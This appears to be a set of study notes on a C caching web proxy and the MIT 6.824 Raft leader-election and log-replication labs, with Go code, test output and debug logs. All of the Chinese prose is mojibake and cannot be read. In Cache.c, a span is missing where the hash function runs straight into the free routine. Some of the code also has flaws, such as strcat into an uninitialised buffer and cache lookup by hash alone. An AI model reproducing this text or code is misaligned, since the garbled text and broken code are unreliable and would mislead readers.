<p>ä½¿ç”¨äº†é“¾è¡¨å’Œå­—ç¬¦ä¸²hashä½œä¸ºå¿«é€ŸæŸ¥æ‰¾å¯¹åº”uriçš„å¯¹è±¡ï¼Œcacheæ›¿æ¢ç®—æ³•ä½¿ç”¨çš„æ˜¯å¤´éƒ¨æ’å…¥ã€å°¾éƒ¨æ·˜æ±°çš„ç®€å•LRUç­–ç•¥ã€‚ä½¿ç”¨pthread_rwlock_tç±»å‹ä½œä¸ºè¯»å†™é”æ§åˆ¶ã€‚</p>
<p>Cache.h</p>
<pre><code class="language-c">typedef struct object{
    int size;
    char* data;
    uint32_t uriHash;
    char response_hdr[MAXLINE];
    struct object* next;
} Object;

typedef struct {
    Object* objs;
    int currentSize;
    pthread_rwlock_t rwlock;
} Cache;


void init_cache(Cache* cache);
void cache_object(Cache* cache, char* uri, char* header, char* data, int size);
Object * get_object(Cache* cache, char* uri);
void destruct_cache(Cache* cache);
</code></pre>
<p>Cache.c</p>
<pre><code class="language-c">#include &quot;cache.h&quot;

static uint32_t hash_string(const char * str, uint32_t len) {
    uint32_t hash=0;
    uint32_t i;
    for (i=0;idata);
    obj-&gt;data = NULL;
    free(obj);
}

static void remove_cache_object(Cache* cache) {
    Object *ptr = cache-&gt;objs;
    if (!ptr-&gt;next) {
        return;
    }
    while (ptr-&gt;next-&gt;next) { // find the pre-tail node
        ptr = ptr-&gt;next;
    }

    cache-&gt;currentSize -= ptr-&gt;next-&gt;size;
    free_object(ptr-&gt;next);
}

static void insert_cache(Cache* cache, Object* obj) {
    while (MAX_CACHE_SIZE - cache-&gt;currentSize &lt; obj-&gt;size) {
        remove_cache_object(cache);
    }
    obj-&gt;next = cache-&gt;objs;
    cache-&gt;objs = obj;
    cache-&gt;currentSize += obj-&gt;size;
}

void init_cache(Cache* cache) {
    cache-&gt;currentSize = 0;
    cache-&gt;objs = NULL;
    pthread_rwlock_init(&amp;cache-&gt;rwlock, NULL);
}

void cache_object(Cache* cache, char* uri, char* header, char* data, int size) {
    if (size &gt; MAX_OBJECT_SIZE) {
        return;
    }
    pthread_rwlock_wrlock(&amp;cache-&gt;rwlock);
    Object *obj = (Object *) Malloc(sizeof(Object));
    obj-&gt;size = size;
    obj-&gt;data = data;
    obj-&gt;uriHash = hash_string(uri, strlen(uri));
    strcpy(obj-&gt;response_hdr, header);
    obj-&gt;next = NULL;

    insert_cache(cache, obj);
    pthread_rwlock_unlock(&amp;cache-&gt;rwlock);
}

Object * get_object(Cache* cache, char* uri) {
    pthread_rwlock_rdlock(&amp;cache-&gt;rwlock);
    uint32_t hash = hash_string(uri, strlen(uri));
    Object *ptr = cache-&gt;objs;
    while (ptr != NULL) {
        if (ptr-&gt;uriHash == hash) {
            pthread_rwlock_unlock(&amp;cache-&gt;rwlock);
            return ptr;
        } else {
            ptr = ptr-&gt;next;
        }
    }
    pthread_rwlock_unlock(&amp;cache-&gt;rwlock);
    return NULL;
}

void destruct_cache(Cache* cache){
    Object *ptr, *prev;
    prev = cache-&gt;objs;
    ptr = prev-&gt;next;
    while (prev) {
        free_object(prev);
        prev = ptr;
        if (ptr) {
            ptr = ptr-&gt;next;
        } else {
            break;
        }
    }
    pthread_rwlock_destroy(&amp;cache-&gt;rwlock);
}
</code></pre>
<p>proxyingå¤„ç†é€»è¾‘</p>
<pre><code class="language-c">void proxying(int fd) {
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];
    char hostname[MAXLINE], port[MAXLINE], query[MAXLINE];
    rio_t rio;
    int is_static;

    Rio_readinitb(&amp;rio, fd);
    if (!Rio_readlineb(&amp;rio, buf, MAXLINE)) // read request line
        return;
    printf(&quot;Request line:%s&quot;, buf);

    char host[MAXLINE];  // request header host
    read_requesthdrs(&amp;rio, host);  // read request header

    sscanf(buf, &quot;%s %s %s&quot;, method, uri, version);

    is_static = parseuri(uri, hostname, port, query);
    if (strlen(host) == 0) {
        strcpy(host, hostname);
    }

    Object *obj = NULL;
    if (is_static) {
        obj = get_object(&amp;cache, uri);
    }

    if (obj == NULL) {
        // open connection to server
        int proxyfd = Open_clientfd(hostname, port);
        // send request to server
        send_requesthdrs(proxyfd, method, query, host);
        // Read response from server and forward to client
        if (is_static) {
            forward_response(proxyfd, fd, uri);
            Dprintf(&quot;Cache current size=%d\n&quot;, cache.currentSize);
        } else {
            forward_dynamic_response(proxyfd, fd);
        }
        Close(proxyfd);
    } else {
        Dprint(&quot;Using cached object.\n&quot;);
        forward_cached_response(obj, fd);
    }
}

void forward_response(int proxyfd, int clientfd, char *uri) {
    rio_t rio;
    int n;
    char buf[MAXLINE];
    char response_header[MAXLINE], *body, *bodyPtr;
    int length; // response body length
    int flag = 1, success = 0;

    // parse response header
    Rio_readinitb(&amp;rio, proxyfd);
    n = Rio_readlineb(&amp;rio, buf, MAXLINE);
    strcat(response_header, buf);
    if (strstr(buf, &quot;OK&quot;) != NULL) {
        success = 1;
    }
    Rio_writen(clientfd, buf, n);

    while ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != 0) {
        Rio_writen(clientfd, buf, n);
        if (flag == 0 &amp;&amp; success) {
            memcpy(bodyPtr, buf, n);
            bodyPtr += n;
        }
        // for debug print
        if (flag &amp;&amp; strcmp(buf, &quot;\r\n&quot;) == 0) {
            strcat(response_header, buf);
            Fputs(&quot;Response header:&quot;, stdout);
            Fputs(response_header, stdout);
            flag = 0;
        } else if (flag == 1) {
            strcat(response_header, buf);
            char *ptr = index(buf, ':'), *end;
            if (strncmp(buf, &quot;Content-length&quot;, ptr-buf) == 0) {
                length = (int)strtol(ptr+1, &amp;end, 10);
                body = Malloc(length * sizeof(char));
                bodyPtr = body;
            }
        }
    }
    if (success) {
        cache_object(&amp;cache, uri, response_header, body, length);
        Dprintf(&quot;Data length=%lu\n&quot;, strlen(body));
    } else {
        Dprint(&quot;Response failed. Not cache.\n&quot;);
    }
}

void forward_dynamic_response(int proxyfd, int clientfd) {
    rio_t rio;
    int n;
    char buf[MAXLINE];
    int flag = 1;

    Rio_readinitb(&amp;rio, proxyfd);
    printf(&quot;Response header:\n&quot;);
    while ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != 0) {
        Rio_writen(clientfd, buf, n);
        // for debug print
        if (flag &amp;&amp; strcmp(buf, &quot;\r\n&quot;) == 0) {
            flag = 0;
        } else if (flag == 1) {
            Fputs(buf, stdout);
        }
    }
}

void forward_cached_response(Object* obj, int clientfd) {
    Rio_writen(clientfd, obj-&gt;response_hdr, strlen(obj-&gt;response_hdr));
    Rio_writen(clientfd, obj-&gt;data, obj-&gt;size);
}

void sigint_handler(int sig) {
    destruct_cache(&amp;cache);
    Dprint(&quot;Cache freed.\n&quot;);
    exit(0);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6824-raft"><a class="header" href="#mit-6824-raft">MIT 6.824 Raft</a></h1>
<h2 id="lab2a-leader-election"><a class="header" href="#lab2a-leader-election">Lab2A Leader election</a></h2>
<p>é¦–å…ˆé€‰ä¸¾å‡ºä¸€ä¸ªleaderï¼Œè®©è¿™ä¸ªleaderæ¥ç®¡ç†å†—ä½™æ—¥å¿—ã€‚leaderä»clientæ¥å—æ—¥å¿—æ¡ç›®ï¼Œåœ¨å…¶ä»–æœåŠ¡å™¨ä¸Šåšå†—ä½™å¤‡ä»½ï¼Œå¹¶å‘ŠçŸ¥å…¶ä»–æœåŠ¡å™¨ä¸€ä¸ªå®‰å…¨çš„æ—¶é—´ç‚¹å°†è¿™äº›æ—¥å¿—åº”ç”¨äºä»–ä»¬è‡ªå·±çš„çŠ¶æ€æœº</p>
<p>leaderå¿…é¡»æ¥å—å…¶ä»–çš„log entries ä»clientï¼Œå¹¶ä¸”åšå¥½å¤‡ä»½</p>
<p>safetyï¼šåœ¨ä¸€ä¸ªlogçš„indexä¸Šï¼ˆå¤šå°serverçš„ï¼‰ï¼Œåªèƒ½æœ‰ä¸€ç§æ—¥å¿—entries</p>
<h3 id="51-raftåŸºç¡€"><a class="header" href="#51-raftåŸºç¡€">5.1 RaftåŸºç¡€</a></h3>
<p>å¼€å§‹çš„æ—¶å€™éƒ½æ˜¯Followerï¼Œtimeoutåå¼€å§‹é€‰ä¸¾ï¼Œå˜æˆcandidateï¼›1ã€åœ¨timeoutåæ²¡æœ‰æ¥åˆ°å¤šæ•°é€‰ç¥¨ï¼Œå†æ¬¡è¿›è¡Œé€‰ä¸¾ï¼›2ã€å¦‚æœæ¥å—äº†å¤šæ•°çš„é€‰ç¥¨ï¼Œå˜æˆleader</p>
<p>æ—¶é—´è¢«åˆ†å‰²ä¸ºtermï¼Œæ¯ä¸ªtermè¢«å¼€å§‹ä¸ºé€‰ä¸¾æœŸï¼Œå¦‚æœæ²¡æœ‰leaderè¢«é€‰ä¸¾å‡ºæ¥ï¼ˆsplit voteï¼‰ï¼Œtermç»“æŸã€‚</p>
<p>æ¯ä¸€ä¸ªserverä¿å­˜ä¸€ä¸ªå½“å‰termçš„æ•°å­—ï¼ˆéšæ—¶é—´çº¿æ€§å¢é•¿ï¼‰ã€‚ä¸è®ºä½•æ—¶serveråœ¨æ²Ÿé€šçš„æ—¶å€™ï¼Œå½“å‰çš„termä¼šè¢«äº¤æ¢ã€‚candidtaeå’Œleaderå‘ç°è‡ªå·±çš„termè¿‡æ—¶çš„æ—¶å€™ï¼Œå°±ä¼šè½¬å˜ä¸ºfollowerã€‚å¦‚æœä¸€ä¸ªserveræ”¶åˆ°äº†ä¸€ä¸ªåŒ…å«è¿‡æ—¶çš„term numberçš„requestï¼Œå®ƒä¼šå¿½ç•¥ã€‚</p>
<h3 id="52-leader-election"><a class="header" href="#52-leader-election">5.2 Leader Election</a></h3>
<p>åœ¨å¼€å§‹çš„æ—¶å€™ï¼Œä¸€ä¸ªserveræ˜¯followerï¼Œå½“æ”¶åˆ°leaderæˆ–è€…candidateçš„RPCæ—¶ï¼Œå®ƒä¼šä¸€ç›´ä¿æŒè¿™ä¸ªçŠ¶æ€ã€‚Leaderä¼šå‘é€å®šæ—¶çš„heartbeatä¿¡æ¯ï¼ˆä¸å«log entriesçš„AppendEntries RPCè°ƒç”¨ï¼‰ç»™æ‰€æœ‰followersï¼Œä»¥ä¿æŒä»–ä»¬çš„å±æ€§çŠ¶æ€ã€‚</p>
<p>å¦‚æœä¸€ä¸ªfolloweråœ¨election timeoutçš„æ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ä»»ä½•äº¤æµä¿¡æ¯ï¼Œå®ƒå°±å¼€å§‹é€‰ä¸¾leader</p>
<p>åœ¨é€‰ä¸¾çš„å¼€å§‹ï¼Œfollowerå¢åŠ å®ƒçš„term numberï¼Œå¹¶ä¸”è½¬æ¢æˆcandidateçŠ¶æ€ã€‚å®ƒç»™è‡ªå·±æŠ•ç¥¨ï¼Œå¹¶ä¸”å‘é›†ç¾¤ä¸­çš„å…¶ä»–serverå‘é€RequestVote RPCè°ƒç”¨ã€‚
ä»¥ä¸‹ä¸‰ç§çŠ¶å†µä¸­ï¼Œcandidateè½¬æ¢è‡ªå·±çš„çŠ¶æ€ï¼š</p>
<ol>
<li>èµ¢å¾—äº†é€‰ä¸¾</li>
<li>å¦ä¸€ä¸ªserverèµ¢å¾—äº†é€‰ä¸¾</li>
<li>æ²¡æœ‰winner
ä»¥ä¸‹æ˜¯ä¸‰ç§æƒ…å†µçš„è¯¦ç»†è¯´æ˜ï¼š</li>
<li>èµ¢å¾—é€‰ä¸¾ &lt;=&gt; åœ¨åŒä¸€ä¸ªtermä¸­ï¼Œè·å–é›†ç¾¤ä¸­çš„å¤§å¤šæ•°é€‰ç¥¨ã€‚ ä¸€ä¸ªserveræœ€å¤šåªèƒ½åœ¨ä¸€ä¸ªtermä¸­æŠ•ç¥¨ä¸€ä¸ªcandidateï¼ˆä»¥FCFSçš„æ–¹å¼æŠ•ç¥¨ï¼‰ï¼Œè¿™ä¸ªæœºåˆ¶ä¿è¯äº†åœ¨ä¸€ä¸ªtermä¸­ï¼Œæœ€å¤šåªæœ‰ä¸€ä¸ªä¼˜èƒœè€…ã€‚å½“ä¸€ä¸ªcandidateèµ¢å¾—é€‰ä¸¾åï¼Œå‘é€heartbeatä¿¡æ¯æ¥ç»ˆæ­¢æ–°çš„é€‰ä¸¾ã€‚</li>
<li>åœ¨ç­‰å¾…é€‰ç¥¨çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ”¶åˆ°äº†å…¶ä»–serverçš„AppendEntries RPCï¼ˆå³ä»–ä¹Ÿæƒ³å½“leaderï¼‰ï¼Œæ ¹æ®term numberçš„å¤§å°å†³å®šæ˜¯å¦å˜å›followerï¼Œè‹¥è°ƒç”¨æ¥è‡ªtermè¾ƒå¤§ï¼ˆ&gt;= å½“å‰çš„candidate termï¼‰çš„ï¼Œåˆ™å˜å›follower</li>
<li>å¤§å®¶éƒ½æ²¡æœ‰è·å¾—è¶³å¤Ÿçš„é€‰ç¥¨ï¼Œé‚£ä¹ˆæ¯ä¸ªcandidateéƒ½timeoutç„¶åè¿›è¡Œæ–°ä¸€è½®çš„é€‰ä¸¾ï¼Œå¹¶å¢åŠ è‡ªå·±çš„term number</li>
</ol>
<p>raftä½¿ç”¨éšæœºçš„time-outé•¿åº¦æ¥é¿å…split vote</p>
<h3 id="raftèŠ‚ç‚¹æ•°æ®ç»“æ„"><a class="header" href="#raftèŠ‚ç‚¹æ•°æ®ç»“æ„">RaftèŠ‚ç‚¹æ•°æ®ç»“æ„</a></h3>
<pre><code class="language-go">// Role is the server's role
type Role int

const (
	FOLLOWER  = 0
	CANDIDATE = 1
	LEADER    = 2
)

type LogEntry struct {
	Command interface{}
	Term    int // è¿™æ¡logEntryæ˜¯åœ¨termæ—¶æœŸè¢«å†™å…¥çš„
}

//
// A Go object implementing a single Raft peer.
//
type Raft struct {
	mu        sync.Mutex          // Lock to protect shared access to this peer's state
	peers     []*labrpc.ClientEnd // RPC end points of all peers
	persister *Persister          // Object to hold this peer's persisted state
	me        int                 // this peer's index into peers[]
	dead      int32               // set by Kill()

	// Your data here (2A, 2B, 2C).
	// Look at the paper's Figure 2 for a description of what
	// state a Raft server must maintain.
	currentTerm int
	votedFor    int        // vote for the candidate id
	log         []LogEntry // log entries

	role Role

	commitIndex int // index of log entry of the highest
	lastApplied int

	nextIndex  []int // å¯¹äºæ¯ä¸ªserverï¼Œéœ€è¦å‘é€çš„æ—¥å¿—ç´¢å¼•
	matchIndex []int // å¯¹æ¯ä¸ªserverï¼Œå·²çŸ¥çš„å·²ç»è¢«å†—ä½™äº†çš„æ—¥å¿—æœ€é«˜ç´¢å¼•

	// channel for communication
	chAppendEntry chan struct{} // ç”¨äºé€šä¿¡çš„ç®¡é“ï¼Œ receive the heartbeat
	chRequestVote chan struct{} // channel, receive the request vote
}

// return currentTerm and whether this server
// believes it is the leader.
func (rf *Raft) GetState() (int, bool) {

	var term int
	var isleader bool
	// Your code here (2A).
	rf.mu.Lock()
	term = rf.currentTerm
	isleader = (rf.role == LEADER)
	rf.mu.Unlock()
	return term, isleader
}
</code></pre>
<p>GetStateå‡½æ•°</p>
<pre><code class="language-go">// return currentTerm and whether this server
// believes it is the leader.
func (rf *Raft) GetState() (int, bool) {

	var term int
	var isleader bool
	// Your code here (2A).
	rf.mu.Lock()
	term = rf.currentTerm
	isleader = (rf.role == LEADER)
	rf.mu.Unlock()
	return term, isleader
}
</code></pre>
<p>Makeå‡½æ•°å¯åŠ¨ä¸€ä¸ªRaftèŠ‚ç‚¹</p>
<pre><code class="language-go">func Make(peers []*labrpc.ClientEnd, me int,
	persister *Persister, applyCh chan ApplyMsg) *Raft {
	rf := &amp;Raft{}
	rf.peers = peers
	rf.persister = persister
	rf.me = me

	// Your initialization code here (2A, 2B, 2C).
	rf.currentTerm = 0
	rf.votedFor = -1
	rf.log = make([]LogEntry, 16)
	rf.log[0] = LogEntry{struct{}{}, -1}
	rf.commitIndex = 0
	rf.lastApplied = 0
	rf.matchIndex = make([]int, len(rf.peers))
	rf.nextIndex = make([]int, len(rf.peers))

	rf.chAppendEntry = make(chan struct{})
	rf.chRequestVote = make(chan struct{})
	rf.role = FOLLOWER

	// å¼€å¯æœåŠ¡
	go rf.startServing()

	// initialize from state persisted before a crash
	rf.readPersist(persister.ReadRaftState())

	return rf
}
</code></pre>
<p>ä¸»è¦é€»è¾‘å‡½æ•°startServing</p>
<pre><code class="language-go">func (rf *Raft) startServing() {
	for {
		if rf.killed() {
			return
		}
		switch rf.role {
		case FOLLOWER:
			rf.following()
		case CANDIDATE:
			rf.election()
		case LEADER:
			rf.sendingHeartBeat()
		}
	}
}

func (rf *Raft) changeRole(role Role) {
	rf.mu.Lock()
	defer rf.mu.Unlock()
	rf.role = role
}
</code></pre>
<p>ä½œä¸ºFollowerçš„å¤„ç†é€»è¾‘</p>
<pre><code class="language-go">func (rf *Raft) following() {
	rand.Seed(time.Now().Unix())
	electionTimeout := rand.Intn(1000) + 400 // in the thesis use 150~300ms, but here use 500~1000ms
	timer := time.NewTimer(time.Millisecond * time.Duration(electionTimeout))
	for {
		if rf.killed() {
			return
		}
		select {
		case &lt;-timer.C:
			DPrintf(&quot;%d: Eletion Timeout, start election\n&quot;, rf.me)
			rf.changeRole(CANDIDATE)
			return
		case &lt;-rf.chAppendEntry:
			electionTimeout := rand.Intn(1000) + 400
			timer.Reset(time.Millisecond * time.Duration(electionTimeout))
		case &lt;-rf.chRequestVote:
			DPrintf(&quot;%d: recieve the candidates' request for vote\n&quot;, rf.me)
			electionTimeout := rand.Intn(1000) + 400
			timer.Reset(time.Millisecond * time.Duration(electionTimeout))
		}
	}
}
</code></pre>
<p>ä½œä¸ºCandidateçš„å¤„ç†é€»è¾‘</p>
<pre><code class="language-go">func (rf *Raft) election() {
	rf.mu.Lock()
	rf.currentTerm++
	rf.votedFor = rf.me
	rf.mu.Unlock()

	args := RequestVoteArgs{}
	args.CandidateID = rf.me
	args.Term = rf.currentTerm
	args.LastLogIndex = len(rf.log) - 1
	args.LastLogTerm = rf.log[args.LastLogIndex].Term

	voteCount := 0
	voteOk := make(chan struct{})
	var voteMu sync.Mutex
	var notified bool = false  // æ˜¯å¦å·²ç»å‘é€ç»™voteOkä¿¡å·

	timer := time.NewTimer(time.Millisecond * time.Duration(rand.Intn(300)+500))
	for serverID := range(rf.peers) {
		if serverID != rf.me {
			go func(server int) {
				reply := RequestVoteReply{}
				if ok := rf.sendRequestVote(server, &amp;args, &amp;reply); ok {
					if reply.VoteGranted {
						voteMu.Lock()
						voteCount++
						if !notified &amp;&amp; voteCount &gt;= len(rf.peers) / 2 {
							voteOk &lt;- struct{}{}
							notified = true  // å…¶ä»–çš„é€‰ç¥¨å°±ä¸å†é€šçŸ¥äº†
							voteMu.Unlock()
						} else {
							voteMu.Unlock()
						}
					}
				}
			}(serverID)
		}
	}
	select {
	case &lt;-voteOk:
		DPrintf(&quot;%d: Become Leader&quot;, rf.me)
		rf.changeRole(LEADER)
		rf.votedFor = -1
		return
	case &lt;-rf.chAppendEntry: // å½“æœ‰å…¶ä»–çš„leaderå·²ç»è¢«é€‰ä¸¾å‡ºæ¥å
		rf.changeRole(FOLLOWER)
		rf.votedFor = -1
		return
	case &lt;-rf.chRequestVote: // æ”¶åˆ°å…¶ä»–candidateçš„åˆæ³•é€‰ç¥¨
		rf.changeRole(FOLLOWER)
		rf.votedFor = -1
		DPrintf(&quot;Receive others' requestVote&quot;)
		return
	case &lt;-timer.C: // åˆ°æ—¶é—´äº†è¿˜æ²¡æœ‰é€‰ç¥¨
		rf.changeRole(FOLLOWER)
		rf.votedFor = -1
		return
	}
}
</code></pre>
<p>ä½œä¸ºMasterçš„å¤„ç†é€»è¾‘</p>
<pre><code class="language-go">func (rf *Raft) sendingHeartBeat() {
	rf.mu.Lock()
	lastLogIndex := len(rf.log) - 1
	for i := range(rf.peers) {
		rf.nextIndex[i] = lastLogIndex + 1
		rf.matchIndex[i] = 0
	}

	args := AppendEntriesArgs{}
	args.Term = rf.currentTerm
	args.LeaderID = rf.me
	args.PrevLogIndex = lastLogIndex // index of log entry immediately preceding new ones
	args.PrevLogTerm = rf.log[args.PrevLogIndex].Term
	args.Entries = []LogEntry{} // empty log entries
	args.LeaderCommit = rf.commitIndex
	rf.mu.Unlock()

	timer := time.NewTimer(time.Duration(time.Millisecond * 200)) // é—´éš”200mså‘å‡ºå¿ƒè·³
	higherTermCh := make(chan struct{})
	gotHigherTerm := false  // æ˜¯å¦æ”¶åˆ°äº†é«˜Termçš„å›å¤
	
	for {
		for serverID := range(rf.peers) {
			if serverID == rf.me {
				continue
			}
			go func(server int) {
				reply := AppendEntriesReply{}
				if ok := rf.sendAppendEntry(server, &amp;args, &amp;reply); ok {
					rf.mu.Lock()
					if !gotHigherTerm &amp;&amp; reply.Term &gt; rf.currentTerm {
						rf.currentTerm = reply.Term
						gotHigherTerm = true
						higherTermCh &lt;- struct{}{}
					}
					rf.mu.Unlock()
				}
			}(serverID)
		}

		select {
		case &lt;-timer.C:
			timer.Reset(time.Duration(time.Millisecond * 200))
		case &lt;-higherTermCh: // discover a server with higher term
			rf.changeRole(FOLLOWER)
			return
		case &lt;-rf.chAppendEntry: // å¦‚æœæ¥æ”¶åˆ°followerçš„é«˜term AppendEntry
			rf.changeRole(FOLLOWER)
			return
		case &lt;-rf.chRequestVote: // å¦‚æœæ¥æ”¶åˆ°candidateçš„é«˜term RequestVote
			rf.changeRole(FOLLOWER)
			return
		}
	}
}
</code></pre>
<p>AppendEntriesï¼ˆå¿ƒè·³æ¥å—çš„RPCï¼‰</p>
<pre><code class="language-go">func (rf *Raft) AppendEntry(args *AppendEntriesArgs, reply *AppendEntriesReply) {
	// follower æ¥æ”¶å¿ƒè·³å¤„ç†
	rf.mu.Lock()
	defer rf.mu.Unlock()
	if len(args.Entries) == 0 {
		if args.Term &lt; rf.currentTerm {  // æ”¶åˆ°çš„å¿ƒè·³Termå¤ªå°
			reply.Success = false
			reply.Term = rf.currentTerm
		} else {
			DPrintf(&quot;%d: Got valid heartbeat from %d\n&quot;, rf.me, args.LeaderID)
			rf.currentTerm = args.Term
			reply.Success = true
			go func(){
				rf.chAppendEntry &lt;- struct{}{}
			}()
		}
	}
}
</code></pre>
<p>RequestVoteï¼ˆæŠ•ç¥¨è¯·æ±‚çš„å¤„ç†ï¼‰</p>
<pre><code class="language-go">type RequestVoteArgs struct {
	// Your data here (2A, 2B).
	Term         int // candidate's term
	CandidateID  int // æš‚æ—¶ç”¨raftsæ•°ç»„çš„ä¸‹æ ‡ä½œä¸ºid
	LastLogIndex int // æœ€åä¸€ä¸ªæ—¥å¿—æ¡ç›®çš„ä¸‹æ ‡
	LastLogTerm  int
}

//
// example RequestVote RPC reply structure.
// field names must start with capital letters!
//
type RequestVoteReply struct {
	// Your data here (2A).
	Term        int  // currentTerm, for candidate to update itself
	VoteGranted bool // trueè¡¨ç¤ºåŒæ„é€‰ä¸¾
}

func (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) {
	// Your code here (2A, 2B).
	rf.mu.Lock()
	defer rf.mu.Unlock()
	if args.Term &lt; rf.currentTerm {
		reply.VoteGranted = false
		reply.Term = rf.currentTerm
		DPrintf(&quot;%d: refuse vote to %d\n&quot;, rf.me, args.CandidateID)
	} else if rf.votedFor == -1 || rf.votedFor == args.CandidateID {
		curLogIndex := len(rf.log) - 1
		if args.LastLogIndex &gt;= curLogIndex &amp;&amp; args.LastLogTerm &gt;= rf.log[curLogIndex].Term { // candidatesçš„logè‡³å°‘å’Œæˆ‘ä¸€æ ·æ–°
			DPrintf(&quot;%d: Vote to %d\n&quot;, rf.me, args.CandidateID)
			reply.VoteGranted = true
			reply.Term = args.Term
			rf.currentTerm = args.Term
			rf.votedFor = args.CandidateID

			go func() {
				rf.chRequestVote &lt;- struct{}{} 
			}() // é€šçŸ¥è‡ªå·±æ”¶åˆ°äº†åˆæ³•çš„è¯·æ±‚æŠ•ç¥¨
		} else {
			reply.VoteGranted = false
			// reply.Term = rf.currentTerm
			DPrintf(&quot;%d: refuese vote to %d, because the old log\n&quot;, rf.me, args.CandidateID)
		}
	} else {
		reply.VoteGranted = false
		// reply.Term = rf.currentTerm
		DPrintf(&quot;%d: refuese vote to %d, because has voted-&gt;%d.\n&quot;, rf.me, args.CandidateID, rf.votedFor)
	}
}
</code></pre>
<p>è¿è¡Œç»“æœ</p>
<pre><code class="language-sh">âœ  raft git:(master) âœ— go test -run 2A -race
Test (2A): initial election ...
  ... Passed --   4.6  3   38    9128    0
Test (2A): election after network failure ...
  ... Passed --   7.5  3   86   17588    0
PASS
ok  	_/Users/sjy/develop/Go/6.824/src/raft	12.486s
</code></pre>
<h2 id="lab2b-log-replication"><a class="header" href="#lab2b-log-replication">Lab2B Log replication</a></h2>
<p>ä»æµ‹è¯•å‡ºå‘è¿›è¡Œç†è§£ï¼ˆapplyChçš„æ„ä¹‰ï¼šå°†æ—¥å¿—åº”ç”¨åˆ°çŠ¶æ€æœºä¸Šï¼‰</p>
<p>ä»TestBasicAgree2B æµ‹è¯•å‡½æ•°å‡ºå‘ -&gt; make_config -&gt; start1<br />
start1å‡½æ•°ä¸­æœ‰å°†commit command å†™å…¥cfgçš„logä¸­ï¼ˆä»é€šé“applyChä¸­æ¥æ”¶æ–°çš„commandï¼‰<br />
åœ¨TestBasicAgree2B æµ‹è¯•å‡½æ•°ä¸­ nCommittedå‡½æ•°ä¼šæ£€æŸ¥cfgçš„logï¼ŒæŸ¥çœ‹æ˜¯å¦å¤§å¤šæ•°èŠ‚ç‚¹å·²ç»agreementäº†<br />
æ‰€ä»¥éœ€è¦æŠŠstart1ä¸­çš„applyChä¼ ç»™å½“å‰çš„serverèŠ‚ç‚¹ï¼Œå½“æœ‰æ–°çš„log entry commitåï¼Œé€šè¿‡applyChå‘é€ç›¸å…³æ¶ˆæ¯</p>
<p>leaderçš„nextIndexæ•°ç»„ä¿å­˜ç€è¦å‘ç»™æ¯ä¸ªserverçš„log indexï¼Œåˆå§‹åŒ–ä¸ºleader çš„æœ€åä¸€ä¸ªlogçš„ä¸‹æ ‡+1(len(log))<br />
leaderçš„matchIndexä¿å­˜ç€å·²ç»å¤åˆ¶åˆ°æŸä¸ªserverçš„log indexï¼Œåˆå§‹åŒ–ä¸º0ï¼›leaderä¸æ–­çš„æ£€æŸ¥matchIndexï¼Œæ¥ç¡®å®šæ˜¯å¦å­˜åœ¨æ–°çš„commitIndex</p>
<p>æ¯ä¸ªserveréƒ½ä¼šä¸åœå¾—æ£€æŸ¥lastApplied Indexï¼Œä¸€ä½†commitIndexå¤§äºlastAppliedï¼Œå½“å‰Serverä¼šæŠŠè¿™æ¡æ—¥å¿—é€šè¿‡applyChåº”ç”¨åˆ°çŠ¶æ€æœºé‡Œ</p>
<h3 id="æ—¥å¿—å¤åˆ¶çš„æµç¨‹"><a class="header" href="#æ—¥å¿—å¤åˆ¶çš„æµç¨‹">æ—¥å¿—å¤åˆ¶çš„æµç¨‹</a></h3>
<p>clientå‘é€command -&gt; leader<br />
leader append to leader's log -&gt; send RPC to follower -&gt; follower append to log(Replicate)<br />
-&gt; majority follower agree -&gt; leader apply the command to state machine(this log marked as committed)<br />
-&gt; follower know the log is committed -&gt; follower apply the command to state machine</p>
<p>å®Œæ•´ä»£ç æˆ‘æ”¾åˆ°<a href="https://gitee.com/sugarcoder/mit6.824.git">gitee</a>ä¸Šäº†ï¼Œä¸‹é¢åªè®°å½•é€šè¿‡æµ‹è¯•çš„æ—¶å€™çš„é‡åˆ°çš„å„ç§é—®é¢˜ã€‚</p>
<p>TestBasicAgree2B ä¸­ç”±äºå¿˜è®°æ›´æ–°AppendEntries RPCçš„Termï¼Œå¯¼è‡´ä¸€ç›´ä¸åŒæ­¥</p>
<p>TestFailAgree2B ä¸­ç”±äºè„±ç¦»è¿æ¥çš„èŠ‚ç‚¹ä¸åœå¾—ElectionTimeoutï¼Œæ‰€ä»¥Termä¸€ç›´å¢åŠ ï¼ŒLeaderä¼šæ”¶åˆ°å¯¹AppendEntriesæ‹’ç»çš„replyï¼Œå› ä¸ºTermçš„åŸå› <br />
æ‰€ä»¥Leaderåœ¨æ”¶åˆ°é«˜Termçš„AppendEntries Replyåï¼Œéœ€è¦step downï¼Œé‡æ–°é€‰ä¸¾ï¼Œæ›´æ–°term</p>
<p>TestFailNoAgree2B Passed (ä½†æ˜¯ä¼šå‡ºç°conflictIndex=-1çš„æƒ…å†µï¼Œè§£å†³ï¼šåœ¨Leaderçš„Termä¸­ï¼Œä¸è¦ç«‹å³ä½¿ç”¨rf.currentTermï¼Œä½¿ç”¨ä¹‹å‰ä¿å­˜çš„LeaderCurrentTermï¼Œé˜²æ­¢è¢«RPCç¯¡æ”¹)<br />
é—®é¢˜ï¼Œå‡ºç°ç±»ä¼¼æ­»é”<br />
Â </p>
<pre><code class="language-log">2021/05/20 12:28:41 Leader 3:Update Server 2 matchIndex = 2, nextIndex = 3
2021/05/20 12:28:41 4: Eletion Timeout, start election
2021/05/20 12:28:41 1: Eletion Timeout, start election
2021/05/20 12:28:41 0: Eletion Timeout, start election
2021/05/20 12:28:42 4: Eletion Timeout, start election
2021/05/20 12:28:43 Follower 4: invalid AppendEntry RPC, args.Term=1, rf.currentTerm=3
2021/05/20 12:28:43 Follower 1: invalid AppendEntry RPC, args.Term=1, rf.currentTerm=2
2021/05/20 12:28:43 Follower 0: invalid AppendEntry RPC, args.Term=1, rf.currentTerm=2
2021/05/20 12:28:43 Leader 3: Saw term 2, step down
2021/05/20 12:28:43 1: Eletion Timeout, start election
2021/05/20 12:28:43 2: refuese vote to 1, because has voted-&gt;3.
2021/05/20 12:28:43 4: refuese vote to 1, because has voted-&gt;4.
